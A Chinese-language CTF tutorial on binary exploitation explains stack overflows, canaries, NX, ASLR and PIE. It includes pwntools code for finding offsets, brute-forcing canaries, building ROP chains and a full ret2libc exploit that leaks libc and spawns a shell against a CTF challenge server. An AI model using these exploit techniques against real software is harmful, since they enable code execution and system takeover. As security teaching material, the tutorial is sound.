# Pwn 入门深度：栈溢出 / Canary / NX / ASLR / PIE 保护机制原理与绕过

---

## 📋 目录

1. [checksec 与保护机制全景](#一checksec)
2. [栈溢出原理与利用](#二栈溢出)
3. [NX 绕过 — ROP 链](#三rop)
4. [Canary 绕过](#四canary)
5. [ASLR/PIE 绕过 — 泄露地址](#五aslrpie)
6. [完整题目：ret2libc](#六ret2libc)
7. [pwntools 脚本模板](#七pwntools模板)

---

## 一、checksec

```bash
# 查看二进制保护
checksec ./pwn

# 输出示例:
[*] '/root/ctf/pwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO     ← GOT可写(可覆写GOT表)
    Stack:    Canary found      ← 有Canary(需绕过)
    NX:       NX enabled        ← 栈不可执行(不能用shellcode)
    PIE:      No PIE (0x400000) ← 地址固定(好消息!)
```

### 保护机制详解

```
Canary (栈金丝雀):
  位置: 返回地址之前
  原理: 函数返回前检查Canary是否被修改
  绕过: 泄露Canary / 跳过程序自身的Canary检查

NX (No-eXecute):
  原理: 栈/堆标记为不可执行
  绕过: ROP (复用代码片段) → 不执行新代码!

PIE (Position Independent Executable):
  原理: 代码段地址随机化
  绕过: 先泄露某个函数地址 → 计算基址 → 确定所有地址

ASLR (Address Space Layout Randomization):  
  原理: 栈/堆/库地址随机化
  绕过: 泄露 libc 函数地址 → 计算 libc 基址

Full RELRO:
  原理: GOT表只读 → 不能覆写GOT
  含义: 不能通过覆写GOT来劫持函数
```

---

## 二、栈溢出

### 原理

```
栈布局 (高→低地址):
  ┌──────────────┐
  │  参数         │ ← RDI/RSI/RDX (x64)
  ├──────────────┤
  │  返回地址     │ ← RIP (控制这个!)
  ├──────────────┤
  │  saved RBP    │ ← 旧的RBP
  ├──────────────┤
  │  Canary       │ ← 如果有
  ├──────────────┤
  │  局部变量     │ ← 数组/缓冲区(溢出点)
  └──────────────┘

溢出流程:
  buffer[64] → 填充 'A'×64 → 覆盖 RBP(8字节) → 覆盖 返回地址
```

### 找偏移

```python
from pwn import *

# 方法1: cyclic 模式
io = process('./pwn')
io.sendline(cyclic(200))
io.wait()
# 查看崩溃地址: dmesg | tail
# 或 core dump: coredumpctl info
offset = cyclic_find(0x6261616b)  # 根据崩溃时的值

# 方法2: GDB 调试
# gdb ./pwn
# pattern create 200
# run
# pattern offset $rsp
```

---

## 三、ROP

### 原理

```
ROP = 不执行自己的代码, 复用程序中已有的指令片段

gadget: 以 ret 结尾的短指令序列
  pop rdi; ret  → 可设置 rdi = 参数 → 调用函数

ROP链:
  padding + pop_rdi + <arg> + <function_address>
```

### 完整 ROP 链

```python
from pwn import *

elf = ELF('./pwn')
rop = ROP(elf)

# 找 gadget
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# 调用 puts(puts@got) → 泄露 libc 地址
payload = b'A' * 72           # 填充
payload += p64(pop_rdi)       # pop rdi; ret
payload += p64(elf.got['puts']) # rdi = puts@GOT
payload += p64(elf.plt['puts']) # 调用 puts(rdi)
payload += p64(elf.sym['main']) # 返回 main(第二次利用)

io.sendlineafter(b'> ', payload)
io.recvline()
leaked = u64(io.recv(6).ljust(8, b'\x00'))
```

### 通用 gadget

```
__libc_csu_init() 中的通用 gadget:
  (通常不需要找单独的 pop rdi)

gadget1: pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
gadget2: mov rdx,r14; mov rsi,r13; mov edi,r12d; call [r15+rbx*8]
→ 通过 r12/r13/r14/r15 控制函数调用参数
```

---

## 四、Canary 绕过

### 方法1: 泄露 Canary

```python
# 如果有输出功能, 可以逐字节泄露 Canary
# Canary 最低字节总是 \x00 (防止字符串函数泄露)

canary = b'\x00'
for i in range(7):
    for b in range(256):
        payload = b'A' * offset
        payload += canary + bytes([b])
        io.send(payload)
        resp = io.recv()
        if b'stack smashing' not in resp:
            canary += bytes([b])
            break
# 现在 canary 是完整的 8 字节
```

### 方法2: 覆写 __stack_chk_fail GOT

```
如果 Canary 被修改, 程序会调用 __stack_chk_fail
如果 GOT 可写 → 覆写 __stack_chk_fail → 指向 system
→ Canary 被破坏 → 调用 system!
```

### 方法3: fork 子进程爆破

```
如果服务器是 fork 模式, 子进程继承父进程的 Canary
→ 每次崩溃不会导致整个服务退出
→ 可以逐字节爆破(最多 256×8 = 2048 次)
```

---

## 五、ASLR/PIE

### 泄露地址

```python
# 通过已有的输出功能泄露地址

# 1. 泄露 PIE 基址
# 如果程序输出某个全局变量的地址:
leaked = u64(io.recv(8))
pie_base = leaked - elf.sym['known_global_var']

# 2. 泄露 libc 基址
# 通过 puts 打印 puts@GOT:
payload = p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.plt['puts'])
libc_puts = u64(io.recv(6).ljust(8, b'\x00'))
libc_base = libc_puts - libc.sym['puts']
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))
```

### ret2libc 完整利用

```python
# 第二次利用: 获取 Shell
payload = b'A' * offset
payload += p64(ret)            # 栈对齐(某些系统要求)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
io.sendline(payload)
io.interactive()
```

---

## 六、完整题目

```
题目: ret2libc (BUUCTF: ciscn_2019_c_1)

分析: 
  ✦ x64, NX enabled → 需要 ROP
  ✦ PIE disabled → 地址固定(elf地址可硬编码)
  ✦ Canary disabled → 可以直接溢出
  ✦ 无 system 函数 → 需要泄露 libc

利用:
  ① 找 offset: 88 字节
  ② puts(puts@got) → 泄露 libc 地址
  ③ 返回 main → 第二次利用
  ④ 计算 system + /bin/sh → get shell!

完整代码见 pwntools 模板
```

---

## 七、pwntools 模板

```python
from pwn import *

# 连接
io = remote('node4.buuoj.cn', 12345)  # 或 process('./pwn')
elf = ELF('./pwn')
libc = ELF('./libc-2.27.so')
rop = ROP(elf)

# Gadget
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]  # ubuntu18+ 栈对齐

offset = 0x58  # 根据实际调整

# Step 1: 泄露 libc
payload1 = b'A' * offset
payload1 += p64(pop_rdi) + p64(elf.got['puts'])
payload1 += p64(elf.plt['puts'])
payload1 += p64(elf.sym['main'])  # 返回 main

io.recvuntil(b'> ')
io.sendline(payload1)

leaked = u64(io.recv(6).ljust(8, b'\x00'))
libc_base = leaked - libc.sym['puts']
system = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

print(f'[*] libc base: {hex(libc_base)}')
print(f'[*] system:    {hex(system)}')

# Step 2: get shell
payload2 = b'A' * offset
payload2 += p64(ret) + p64(pop_rdi) + p64(binsh) + p64(system)

io.recvuntil(b'> ')
io.sendline(payload2)
io.interactive()
```

---

## ✅ Pwn 入门 Checklist

- [ ] checksec 分析
- [ ] pwntools 熟练
- [ ] 找溢出偏移(cyclic/GDB)
- [ ] ROP gadget 搜索
- [ ] 泄露地址 → 绕过 ASLR/PIE
- [ ] Canary 绕过(泄露/爆破)
- [ ] pwnable.kr bof + collision
